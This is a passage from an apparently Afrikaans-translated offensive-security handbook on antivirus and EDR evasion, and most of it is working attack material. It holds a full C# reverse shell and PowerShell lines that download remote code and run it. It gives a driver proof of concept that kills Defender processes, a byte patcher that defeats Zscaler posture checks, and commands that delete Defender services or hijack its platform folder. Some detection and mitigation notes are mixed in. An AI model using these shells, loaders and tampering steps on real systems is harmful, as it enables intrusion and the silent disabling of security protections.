cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou **die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Die huidige defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit saam met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met behulp van compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir 'n voorbeeld van die bou van injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanuit kernelruimte afskakel

Storm-2603 het ’n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om eindpuntbeskerming af te skakel voordat dit ransomware laat val het. Die instrument bring sy **eie kwesbare maar *ondertekende* drywer** saam en misbruik dit om bevoorregte kernelbewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Ondertekende drywer**: Die lêer wat na die skyf afgelaai word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende drywer `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die drywer ’n geldige Microsoft-handtekening het, word dit gelaai selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die driver as ’n **kernel service** en die tweede een begin dit, sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs wat deur die driver blootgestel word**
   | IOCTL code | Vermoë                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR services te stop) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op die skyf uit |
   | `0x990001D0` | Laai die driver af en verwyder die service |

   Minimale C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil user-mode-beskermings heeltemal; kode wat in die kernel uitgevoer word, kan *beskermde* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardening-funksies.

Opsporing / Versagting
• Aktiveer Microsoft se blokkeerlys vir kwesbare drywers (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
• Monitor die skep van nuwe *kernel*-dienste en stel ’n waarskuwing uit wanneer ’n drywer vanaf ’n wêreldskryfbare gids gelaai word of nie op die toelaatlys is nie.
• Let op user-mode-handvatsels na pasgemaakte toestelobjekte, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Om Zscaler Client Connector se houdingkontroles te omseil deur binêre lêers op skyf te verander

Zscaler se **Client Connector** pas toestelhoudingreëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Houdingevaluering vind **heeltemal aan die kliëntkant plaas** (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte bevestig slegs dat die uitvoerbare lêer wat koppel **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binêre lêers op skyf te verander**, kan albei meganismes geneutraliseer word:

| Binêre lêer | Oorspronklike logika wat verander is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, dus voldoen elke kontrole |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige proses (selfs ’n ongetekende een) kan aan die RPC-pipes koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel uit ’n minimale patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** posture checks vertoon **groen/voldoenend**.
* Ongesigneerde of gewysigde binaries kan die benoemde-pyp-RPC-endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar byte-patches omseil kan word.

## Microsoft Defender `BTR.sys` misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige, deur Microsoft ondertekende remediëringskomponent sonder ’n geheuekorrupsiebug en sonder ’n IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private remediëringstransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **post-kompromittering AV/EDR-neutraliseringsprimitief, nie aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-hulpbron `BOOTTIMETOOL` onttrek word, eerder as om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender plaas die hulpbron gewoonlik as ’n ewekansige `[a-z]{8}.sys`-lêer neer en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer, en gee ná suksesvolle uitvoering `0xC0000056` (`STATUS_DELETE_PENDING`) terug sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die geanaliseerde builds hergebruik ’n vaste 256-greep-sleutel, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kop van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kop-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n nulbeëindigde UTF-16-terugvoerpad en enige aantal items. Elke item het ’n kop van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat eindig op **presies vier NUL-grepe**. Elke kop-/datastreek word onafhanklik nagegaan met CRC-32-polinoom `0xEDB88320`, begintoestand `0xFFFFFFFF` en **geen finale XOR** (`~CRC32`); die CRC-toestand word vir elke streek teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe bloot.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Skrap ’n lêer, insluitend ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken skrap |
| 4 | `[Flags][key path]` | Skrap ’n registersleutel rekursief |
| 5 | `[Flags][key path + "\\" + value]` | Skrap ’n registerwaarde |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/werk ’n registerwaarde by en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die sleutel-/waardeskeier op die draad **twee opeenvolgende backslashes**; ’n konvensioneel geformateerde pad sal nie korrek gesplit word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier datagrepe van elke item word sy resulterende `NTSTATUS`. Vir aksies 1 en 2, wat geen voorste vlagveld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek te maak vir daardie status.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeëlaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: haal `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/kontroleer-sommeer/enkripteer gekoppelde aksies, skep die diensregistersleutel direk, en roep dan `NtLoadDriver` aan vir `-trigger now` of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registervoorbereiding vermy die normale SCM `CreateServiceW`-pad en veroorsaak dus **nie** diensinstallasie-Event ID 7045 nie. Artefakte wat deur boot geaktiveer is, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die bergingsstapel en `SystemRoot`-skakel gereed is. `Start=1` plus die hoëprioriteit-`Boot Bus Extender`-groep laat dit eerder in Fase 1 uitvoer: NTFS is bruikbaar, maar baie sekuriteitsdrywers wat met stelselbegin gelaai word en EDR-dienste in gebruikersmodus is nog nie geïnisialiseer nie. Boot-start-filters soos `WdFilter` is dalk reeds gelaai, maar BTR kan hul binaries of dienskonfigurasie verwyder voordat die volgende begin, en kan diensuitvoerbare lêers uitvee voordat SCM dit begin. ELAM sluit nie hierdie gaping nie, omdat BTR ná boot-start-evaluering loop en 'n geldige Microsoft-handtekening dra.<sup>[[36]](#references)</sup>

Veelvuldige aksies word in een transaksie uitgevoer. Die PoC voeg Aksie 1 vooraan vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, voer dan sy eie uitveeversoek uit en verwyder dit voordat dit ontlaai. Dit verminder die bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas kan word sodat die drywer en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelasies vir opsporing met hoë seinwaarde

Reëls wat slegs op handtekeninge staatmaak en die Microsoft-lys van geblokkeerde kwesbare drywers spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, terwyl jy legitieme Defender-herkoms van 'n arbitrêre lanseerder onderskei.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`-skepping is universeel vir BTR-staging. 'n `.dat` ADS wat aan dieselfde `.sys` geheg is, is besonder verdag omdat legitieme Defender-terugvoer gewoonlik onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` geplaas word.
- **Sysmon 12/13 sonder System 7045:** korreleer direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` met `Args=...:changelist` en `Group=Boot Bus Extender`, sonder 'n ooreenstemmende SCM-installasiegebeurtenis.
- **Sysmon 6 -> 23:** korreleer 'n bekende BTR-drywerlading uit nie-Defender-herkoms met daaropvolgende lêerverwydering wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinaries.
- **Sysmon 11 -> 23:** waarsku oor die vinnige skepping en verwydering van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; 'n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer 'n sekuriteitnutsding se drywer deur `cmd.exe`, PowerShell of 'n onbekende proses gestadieer word nie.

## Misbruik van Protected Process Light (PPL) om met AV/EDR te peuter deur LOLBINs te gebruik

Protected Process Light (PPL) dwing 'n hiërargie van ondertekenaars/vlakke af sodat slegs beskermde prosesse met dieselfde of 'n hoër vlak met mekaar kan peuter. Aanvallend gesproke, as jy wettiglik 'n PPL-geaktiveerde binary kan begin en die argumente daarvan beheer, kan jy goedaardige funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-gesteunde skryfprimitief teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat 'n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL's) moet met 'n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Versoenbare beskermingsvlak moet aangevra word wat by die ondertekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal veroorsaak dat die proses nie geskep kan word nie.

Sien ook hier 'n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdernutsgoed
- Oopbron-hulpmiddel: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente aan die teiken-EXE deur):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruikspatroon:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-primitief: ClipUp.exe
- Die ondertekende stelselbinêre lêer `C:\Windows\System32\ClipUp.exe` begin ’n nuwe instansie van homself en aanvaar ’n parameter om ’n loglêer na ’n pad te skryf wat deur die oproeper gespesifiseer word.
- Wanneer dit as ’n PPL-proses geloods word, vind die lêerskrywing met PPL-steun plaas.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te verwys.

8.3-kortpad-hulpmiddels
- Lys kort name: `dir /x` in elke ouergids.
- Lei ’n kort pad in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Loods die PPL-bekwame LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n lanseerder (bv. CreateProcessAsPPL) te gebruik.
2) Gee die ClipUp-logpadargument deur om ’n lêer in ’n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3-kort name indien nodig.
3) As die AV normaalweg die teikenbinêre lêer oop of gesluit hou terwyl dit loop (bv. MsMpEng.exe), skeduleer die skrywing tydens selflaai, voordat die AV begin, deur ’n outomatiese diens te installeer wat betroubaar vroeër loop. Bevestig die selflaaivolgorde met Process Monitor (selflaairegistrasie).
4) Ná herbegin vind die PPL-gesteunde skrywing plaas voordat die AV sy binêre lêers sluit, wat die teikenlêer beskadig en verhoed dat dit begin.

Voorbeeld-aanroep (paaie vir veiligheid verwyder/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, slegs die plasing daarvan; die primitief is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Plaaslike admin/SYSTEM is nodig om ’n service te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporings
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers as ouerproses begin word, rondom opstart.
- Nuwe services wat ingestel is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek die skepping/wysiging van services voordat Defender-opstartfoute voorkom.
- Monitering van lêerintegriteit op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en afwykende gebruik van PPL-vlakke deur nie-AV-binaries.

Versagtings
- WDAC/Code Integrity: beperk watter getekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Service-higiëne: beperk die skepping/wysiging van services wat outomaties begin en monitor manipulasie van die beginvolgorde.
- Maak seker dat Defender se peuterbeskerming en beskerming tydens vroeë opstart geaktiveer is; ondersoek opstartfoute wat op korrupsie van binaries dui.
- Oorweeg dit om 8.3-kortnaamgenerering te deaktiveer op volumes waarop sekuriteitsnutsmiddels gehuisves word, indien dit met jou omgewing versoenbaar is (toets deeglik).

## Peutering met Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende pad op te som:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-serviceprosesse daarvandaan (terwyl die service-/registerpaaie dienooreenkomstig bygewerk word). Hierdie seleksie vertrou op gidsinskrywings, insluitend gidsherontledingspunte (symlinks). ’n Administrateur kan dit benut om Defender na ’n pad te herlei waaroor ’n aanvaller skryfregte het, en DLL-sideloading of diensonderbreking te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Die vermoë om te herlaai of Defender-platformherseleksie te aktiveer (service-herbegin tydens opstart)
- Slegs ingeboude nutsmiddels word benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformseleksie vertrou op gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te bevestig dat die teiken na ’n beskermde/vertroude pad verwys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n directory symlink met ’n hoër weergawe binne Platform wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien, asook die dienskonfigurasie/register wat daardie ligging weerspieël.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas/vervang DLL's wat Defender uit sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die weergawe-simboliese skakel sodat die gekonfigureerde pad met die volgende begin nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sy eie voorregte-eskalasie bied nie; dit vereis adminregte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2-implantaat en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde API's deur aanvallerbeheerde, position-independent code (PIC) te stuur. Dit veralgemeen evasion tot meer as die beperkte API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLL's.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Hoëvlakaanpak
- Plaas 'n PIC-blob langs die teikenmodule met 'n reflective loader (voorafgeplaas of as metgesel). Die PIC moet selfstandig en posisie-onafhanklik wees.
- Terwyl die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en pas die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) aan sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasions uit voordat dit die regte API-adres aanroep. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die aanroep (bv. beacon-streke enkripteer, RWX→RX, bladsyname/-toestemmings verander) en dit dan ná die aanroep herstel.
  - Call-stack spoofing: bou 'n onskadelike stack en skakel oor na die teiken-API sodat call-stack-ontleding die verwagte frames oplewer.<sup>[[9]](#references)</sup>
- Voer vir versoenbaarheid 'n koppelvlak uit sodat 'n Aggressor-script (of ekwivalent) kan registreer watter API's vir Beacon, BOFs en post-ex-DLL's ge-hook moet word.

Waarom IAT hooking hier
- Werk vir enige kode wat die ge-hookte import gebruik, sonder om tool-kode te wysig of daarop staat te maak dat Beacon spesifieke API's proxy.
- Dek post-ex-DLL's: deur LoadLibrary* te hook, kan jy module-laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack-evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep, teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch ná relocations/ASLR en voor die eerste gebruik van die import toe. Reflective loaders soos TitanLdr/AceLdr wys hoe hooking tydens DllMain van die gelaaide module gedoen word.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy voor patching vasgelê het, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy writable+executable-bladsye.

Call-stack spoofing-stub
- PIC-stubs in die styl van Draugr bou ’n vals oproepketting (return addresses in benign modules) en spring dan na die werklike API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting-/stack stitching-tegnieke om binne verwagte frames te land voordat die API-proloog begin.

Operasionele integrasie
- Plaas die reflective loader voor in post-ex-DLLs sodat die PIC en hooks outomaties geïnisialiseer word wanneer die DLL gelaai word.
